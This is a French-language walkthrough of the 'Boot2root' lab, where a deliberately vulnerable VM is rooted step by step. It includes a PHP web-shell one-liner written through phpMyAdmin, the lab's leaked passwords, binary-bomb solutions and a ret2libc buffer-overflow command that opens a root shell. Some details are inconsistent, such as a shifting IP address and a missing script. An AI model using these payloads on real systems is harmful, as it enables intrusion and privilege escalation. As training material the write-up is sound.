
# Boot2root

Dans ce projet, l'objectif est d'acquérir les privilèges root sur une VM. Afin de valider la partie obligatoire du projet, il faut obtenir les privilèges root sur le serveur en utilisant deux méthodes différentes.
Chaque méthode employée doit être accompagnée d'un compte rendu complet expliquant les différentes étapes pour devenir root sur le serveur.




# Reconnaissance de la cible

## Création d'un Réseau Privé Hôte :
Tout d'abord, nous avons mis en place un réseau privé hôte pour notre machine virtuelle, en lui attribuant l'adresse IP 192.168.56.107 avec un masque de sous-réseau /24.

## Exploration des Ports : 
Nous avons utilisé l'outil Nmap pour scanner l'adresse 192.168.56.107 et découvrir les ports ouverts sur le serveur. Le résultat de l'analyse a révélé les ports suivants :
        21/tcp (FTP)
        22/tcp (SSH)
        80/tcp (HTTP)
        143/tcp (IMAP)
        443/tcp (HTTPS)
        993/tcp (IMAPS)

Cette information nous donne une vue d'ensemble des services en cours d'exécution sur le serveur.

## Utilisation de l'outil Dirb :
Enfin, nous avons exécuté l'outil Dirb sur l'adresse 192.168.56.107 pour obtenir une liste complète des URL possibles vers les fichiers et répertoires présents sur le serveur. Cela nous a permis de mieux explorer la structure du serveur et de trouver des points d'entrée potentiels pour notre exploration ultérieure.

    $ dirb https://192.168.56.107/

    ...

    ==> DIRECTORY: https://192.168.56.107/forum/                                                                  
    ==> DIRECTORY: https://192.168.56.107/phpmyadmin/                                                  
    ==> DIRECTORY: https://192.168.56.107/webmail/

    ...
    


## Analyse du Post "Problème de Connexion" de l'utilisateur "lmezard" :
En naviguant sur le forum, nous avons trouvé un post intitulé "Problème de Connexion ?" créé par un utilisateur nommé "lmezard".
Dans ce post, il y avait une longue liste de journaux d'activité appartenant au serveur. Nous avons remarqué une ligne qui indiquait un refus de mot de passe pour l'identifiant "!q]Ej?5K5cyAJ".
Cette ligne semblait contenir un mot de passe potentiel. Par conséquent, nous avons tenté de nous connecter au site en utilisant l'identifiant "lmezard" et le mot de passe "!q]Ej?5K5cyAJ". Cela fonctionne.


# Webmail

## Accès au Webmail et Identification : 

Nous avons accédé à un service de webmail qui nous a permis de nous identifier. Pour ce faire, nous avons utilisé l'adresse e-mail "laurie@borntosec.net" et le mot de passe "!q]Ej?5K5cyAJ". Après avoir entré ces informations, nous avons réussi à nous connecter avec succès.

En explorant la boîte de réception du webmail, nous avons trouvé un e-mail qui a attiré notre attention. Cet e-mail provenait de l'adresse "qudevide@mail.borntosec.net". Le contenu de cet e-mail indiquait qu'il y avait des problèmes de connexion à la base de données (DB). L'e-mail suggérait également d'utiliser les informations suivantes pour probablement se connecter à la DB : "root/Fg-'kKXBj87E:aJ$".
# PhpMyAdmin

## Accès à phpMyAdmin : 
Nous avons accédé à l'interface web de phpMyAdmin pour essayer d'utiliser les informations d'identification que nous venions de découvrir. À notre grande satisfaction, cela a fonctionné, et nous avons obtenu un accès à la base de données (DB).

## Création d'un Fichier PHP Backdoor : 
Depuis l'interface de phpMyAdmin, nous avons obtenu les autorisations nécessaires pour créer un nouveau fichier PHP. Cela nous a permis de mettre en place une injection de backdoor PHP. Dans la console MySQL de phpMyAdmin, nous avons exécuté la commande SQL suivante :


    SELECT "<?php system($_GET['cmd']); ?>" into outfile "/var/www/forum/templates_c/backdoor.php";

Cette commande a créé un fichier PHP appelé "backdoor.php" dans le répertoire "/var/www/forum/templates_c/".

## Accès au Backdoor PHP : 
À présent, notre backdoor était accessible en naviguant vers l'URL "/forum/templates_c/backdoor.php" sur le serveur.

## Exploitation du Backdoor :
En visitant l'URL "192.168.56.105/forum/templates_c/backdoor.php?cmd=cat%20/home/LOOKATME/password", nous avons pu exécuter une commande via notre backdoor PHP. Cette commande nous a permis d'obtenir un nom d'utilisateur et un mot de passe :

Utilisateur : lmezard

Mot de passe : G!@M6f4Eatau{sF"
# FTP

## Accès FTP au Serveur : 
À partir d'un terminal, nous avons utilisé un client FTP pour établir une connexion avec le serveur. Nous avons utilisé la commande "open" pour spécifier l'adresse IP du serveur. Ensuite, nous avons fourni les informations d'identification de l'utilisateur "lmezard" et le mot de passe "G!@M6f4Eatau{sF". Une fois connectés, nous avons pu exécuter la commande "ls" pour lister les fichiers présents sur le serveur et avons remarqué la présence de fichiers "README" et "fun".

Pour récupérer ces fichiers sur notre machine hôte, nous avons utilisé la commande "get" suivie du nom du fichier que nous souhaitions télécharger. Après avoir obtenu les fichiers souhaités, nous avons quitté la session FTP.

Le fichier "fun" s'est révélé être un challenge qui nous permettrait d'obtenir une paire identifiant/mot de passe pour se connecter en SSH sur le shell du serveur.

## Décompression du Fichier "fun" :
Nous avons constaté que le fichier "fun" était un fichier binaire partiellement lisible, en réalité une archive compressée au format tar. Pour extraire son contenu, nous avons utilisé la commande "tar -xvf". Cette opération a créé un dossier appelé "ft_fun" contenant plusieurs fichiers .pcap.

## Analyse des Fichiers .pcap : 
Les fichiers .pcap contenaient des extraits de code. Nous avons remarqué qu'il y avait un fichier contenant une fonction "main" et d'autres fichiers contenant des morceaux de code. Certains fichiers .pcap contenaient les en-têtes de fonctions, tandis que d'autres contenaient le contenu des fonctions. Notre objectif était de retrouver les parties manquantes pour assembler un seul et unique code qui pouvait être compilé pour révéler le mot de passe.

    (La partie de script pour recréer le code est manquante dans cette explication.)

Le mot de passe obtenu était : "Iheartpwnage". Le dernier "printf" nous indiquait de crypter le mot de passe en utilisant l'algorithme SHA-256 pour obtenir le mot de passe final.

Nous avons utilisé un outil en ligne tel que "CyberChef" avec l'option SHA-256 pour obtenir la paire "laurie:330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4" pour se connecter en SSH sur le serveur.
# SSH

## Laurie

Nous nous sommes connectés en SSH au serveur en utilisant les informations d'identification "laurie:192.168.56.107" depuis notre machine hôte. Après avoir établi la connexion, nous avons exécuté la commande "ls" pour voir les fichiers présents sur le serveur, ce qui nous a permis de repérer deux fichiers, "README" et "bomb".

Fichier "bomb" : Il s'agit d'un exécutable binaire qui lance le défi.
Fichier "README" : Ce fichier nous a fourni un indice sous forme de caractères et de chiffres, notamment "P", "2", "b", "o", et "4". Ces caractères correspondent à certaines étapes dans la diffusion du défi.

### Utilisation de Ghidra : 
Nous avons utilisé l'outil Ghidra pour désassembler le code C à partir du binaire "bomb". Cela nous a permis d'analyser le code et de trouver des solutions pour diffuser le défi.

## Phase 1 : 
La première phase ne fait qu'une comparaison de chaînes de caractères avec la string "Public speaking is very easy."

    Public speaking is very easy.

## Phase 2 : 
La fonction phase 2 verifie qu'il y a bien 6 entier rentrees. Le code nous dit que le premier element est 1 et l'indice nous dit que le deuxieme est 2. Grace a l'algo de verification on en deduit : tab[i + 1] != (i + 1) * tab[i].

    1 2 6 24 120 720

## Phase 3 : 
La fonction phase 3 verifie au'il y a 3 elements en entree (uint char int). Le switch case a partir du premier entier nous indiaue qu'il doit etre entre 0 et 7. Ensuite plusieurs combinaisaons sont possibles. Sachant que l'indice est deuxieme caractere = 'b', Il y a trois combinaisons possibles.

    1 b 214

## Phase 4 : 
La fonction phase 4 verifie qu'il y a seulement un parametre et qu'il est superieur ou egale a 1
Func 4 appelle dans phase4, verifie que le nombre est superieur a 2 sinon c'est pas bon
Cette func4 implemente la suite de fibonacci. Dans phase4, le retour de la fonction doit etre 55 sinon ca explose. On en deduit que le nombre doit etre 9 (car la suite demarre a F(1) donc F(10) = F(9)) en entree pour obtenir 55 selon la suite de fibonacci.

    9


## Phase 5 : 
La fonction phase 5 verifie que la string envoye est de longueur egale a 6 sinon ca explose. Une boucle rempli un tableau de char selon une logique.
Une fonction interne verifie si l'element est different de la string "giants" alors ca explose. Donc il faut que param_1 apres traitement soit egale a "giants".
Pour cela il nous faut comprendre l'algorithme. Dans une boucle de 5-6 tours, le programme attribut a chaque index d'un tableau d'int une valeur. Cette valeur est string[param1[i] & 0xf]. L'operation '& 0xf' effectue sur param1[i] permet de garder seulement les bits de poids faible. Le code ne nous permet pas d'avoir acces aux valeurs de strings qui nous permettera mieux de comprendre les valeurs attendus.

On rentre dans gdb sur le binaire bomb
On met un breakpoint sur la ligne assembleur qui recense la variable string pour pouvoir acceder a sa valeur durant l'execution puisqu'elle n'est pas presente dans le code. 

    gdb bomb
    break *0x8048d62
    run
    /* [nous sommes obliges de renseigner les etapes precedentes de diffusion de la bombe pour pouvoir arriver dans la fonction phase5 sans exploser] */
    x/s 0x804b220

On obtient 

    0x804b220:	"isrveawhobpnutfg\260\001"

Soit un contenu "isrveawhobpnutfg" de taille 16.
Apres cela on peut deduire qu'il faut arriver a ecrire "giants" a partir de string[16] avec cette operation string[param1[i] & 0xf] ou param1[i] est la chaine de caracteres de longueur 6.

    opekmq

## Phase 6 : 
La fonction phase 6 verifie que 6 entiers sont rentrees en param sinon c'est pas bon.
L'indice pour celui ci est 4 pour le premier chiffre
La premiere boucle verifie que chacun des 6 chiffres n'est pas superieur a 6 (si 5 < chiffre - 1, ca pete). Et elle verifie qu'aucun des chiffres soit similaire.
Une autre boucle attribut des valeurs en fonction de notre chiffre rentre en parametre et les trie selon un ordre.
Une ligne dans la fonction nous interesse : local_38 = node1
Cette variable semble pointee vers une structure chainee
Si on rentre dans gdb, et qu'on affiche les nodes voila ce qu'on obtient :

    (gdb) p (int)node1
    $1 = 253
    (gdb) p (int)node2
    $2 = 725
    (gdb) p (int)node3
    $3 = 301
    (gdb) p (int)node4
    $4 = 997
    (gdb) p (int)node5
    $5 = 212
    (gdb) p (int)node6
    $6 = 432

Sachant que le premier chiffre est 4 on peut en deduire que 4 = node4 car c'est le plus grands.
Ensuite on a le node 2 > node 6 > node 3 > node 1 > node 5
Donc la reponse est : 

    4 2 6 3 1 5

Apparement il y a un soucis dans le sujet donc la vrai reponse est :
    
    4 2 6 1 3 5


Apres toutes ces etapes on peut creer le mot de passe final pour 'thor' :
Publicspeakingisveryeasy.126241207201b2149opekmq426135

## Thor

Pour établir une connexion SSH avec "thor@192.168.56.107", nous avons découvert un fichier nommé "turtle" qui contenait des instructions à suivre. Il est apparu que le terme "turtle" faisait référence à la bibliothèque Python "turtle", utilisée pour le dessin graphique.

En exécutant un script Python associé à la bibliothèque "turtle", nous avons obtenu la chaîne de caractères "SLASH". 

    Vous pouvez consulter le script Python dans le fichier "/scripts/solution1/tortue.py" pour voir le détail de cette opération.

À la fin du fichier "turtle", il y avait la phrase "Can you digest the message?". Cette phrase s'est avérée significative, car le terme "digest" fait référence au protocole de hachage MD5 couramment utilisé pour crypter les mots de passe. Nous avons donc utilisé un outil en ligne tel que CyberChef pour hacher la chaîne "SLASH" en MD5.

Le mot de passe final pour l'accès SSH a Zaz est : "646da671ca01bb5d84dbb5fb2238dc8e".

## Zaz

Lors de notre accès au profil, nous avons remarqué la présence de deux éléments : un fichier nommé "exploit_me" et un répertoire appelé "mail". Cependant, les fichiers à l'intérieur du dossier "mail" étaient vides.

Pour mieux comprendre le fonctionnement de "exploit_me", nous avons utilisé Ghidra pour analyser le code source en langage C. Dans la fonction "main", nous avons identifié qu'un argument fourni serait copié dans un tableau de caractères de taille 140, puis affiché à l'aide de la fonction "puts()".

### Buffer overflow

La limite de 140 caractères du tampon nous a conduit à envisager l'exploitation d'un débordement de tampon, qui pourrait nous permettre d'obtenir un accès au terminal en tant qu'utilisateur "root", étant donné que "exploit_me" est exécuté avec des privilèges "root".

Pour réussir cette attaque, nous avons d'abord désactivé l'ASLR (Address Space Layout Randomization) en vérifiant la valeur de la commande :

    cat /proc/sys/kernel/randomize_va_space

Si la réponse était "0", cela signifiait que l'ASLR était désactivé.

Ensuite, nous avons généré une chaîne de caractères de 140 caractères avec la syntaxe Python : 

    python -c 'print "0" * 140'

Cette chaîne de caractères serait utilisée pour provoquer un débordement de tampon.

Pour identifier l'adresse à laquelle se produirait un "segfault" (violations de segmentation), nous avons utilisé GDB (GNU Debugger). Nous avons exécuté la commande 

    gdb -q --args ./exploit_me python -c 'print("A" * 140)'
    run
    c

Le "segfault" a été déclenché à l'adresse "0xb7e45400" (correspondant à "__libc_start_main") avec une chaîne de caractères de 140 caractères.

L'objectif principal de cette attaque par débordement de tampon était d'exécuter du code malveillant ou d'obtenir un accès au terminal en tant qu'utilisateur "root".

Pour atteindre cet objectif, nous avons cherché à exécuter "/bin/sh" en utilisant la commande "system". Pour ce faire, nous avons construit une structure de paramètres : [buffer de débordement] [adresse de "system()"] [adresse de retour] [adresse de "/bin/sh"].

Pour obtenir l'adresse de "system", nous avons utilisé GDB en plaçant un point d'arrêt sur "main", en lançant le programme et en affichant la valeur de "system".

    gdb exploit_me
    b main
    r
    p system

On recupere l'adresse de system : 0xb7e6b060


Nous avons également trouvé l'adresse de "/bin/sh" en utilisant la commande "find" 

    find __libc_start_main,+99999999,"/bin/sh"

ou en inspectant les plages d'adresses avec "info proc map" dans GDB

    (gdb) info proc map
Cela nous affiche une liste de plage d'adresse. 

    Mapped address spaces:

	Start Addr   End Addr       Size     Offset objfile
	0x8048000  0x8049000     0x1000        0x0 /home/zaz/exploit_me
	0x8049000  0x804a000     0x1000        0x0 /home/zaz/exploit_me
	0xb7e2b000 0xb7e2c000     0x1000        0x0 
	0xb7e2c000 0xb7fcf000   0x1a3000        0x0 /lib/i386-linux-gnu/libc-2.15.so
	0xb7fcf000 0xb7fd1000     0x2000   0x1a3000 /lib/i386-linux-gnu/libc-2.15.so
	0xb7fd1000 0xb7fd2000     0x1000   0x1a5000 /lib/i386-linux-gnu/libc-2.15.so
	0xb7fd2000 0xb7fd5000     0x3000        0x0 
	0xb7fdb000 0xb7fdd000     0x2000        0x0 
	0xb7fdd000 0xb7fde000     0x1000        0x0 [vdso]
	0xb7fde000 0xb7ffe000    0x20000        0x0 /lib/i386-linux-gnu/ld-2.15.so
	0xb7ffe000 0xb7fff000     0x1000    0x1f000 /lib/i386-linux-gnu/ld-2.15.so
	0xb7fff000 0xb8000000     0x1000    0x20000 /lib/i386-linux-gnu/ld-2.15.so
	0xbffdf000 0xc0000000    0x21000        0x0 [stack]

    
On cible un interval d'adresse au niveau de la libc pour chercher /bin/sh */

    ==> 0xb7e2c000 0xb7fcf000   0x1a3000        0x0 /lib/i386-linux-gnu/libc-2.15.so

    (gdb) find 0xb7fcf000, 0x1a3000,"/bin/sh"

Il faut transformer ces adresses en écriture de shellcode pour respecter la structure des paramètres.

Adresse de "system" :

    0xb7e6b060 => \x60\xb0\xe6\xb7

Adresse de "/bin/sh" :

    0xb7f8cc58 => \x58\xcc\xf8\xb7

Voici le shellcode à intégrer en argument après le buffer overflow :

    "\x60\xb0\xe6\xb7" + "OSEF" + "\x58\xcc\xf8\xb7"

"System" permet de faire appel à des fonctions système. Il attend en arguments dans la pile l'adresse de retour de la fonction ainsi que l'adresse de la fonction elle-même.

D'où le shellcode respectant l'ordre [system] + [adresse de retour] + [adresse /bin/sh]. Dans notre cas, il n'est pas important de donner l'adresse de retour de la fonction ; tout ce qui nous importe est d'ouvrir un shell.

### Élévation des privilèges

Enfin, nous avons exécuté la commande finale suivante :

    ./exploit_me `python -c 'print("A" * 140 + "\x60\xb0\xe6\xb7" + "OSEF" + "\x58\xcc\xf8\xb7")'`

Cette commande a ouvert un shell en tant qu'utilisateur "root". En utilisant la commande "whoami", nous avons confirmé que nous avions obtenu les privilèges "root".

    # whoami
    root
    #
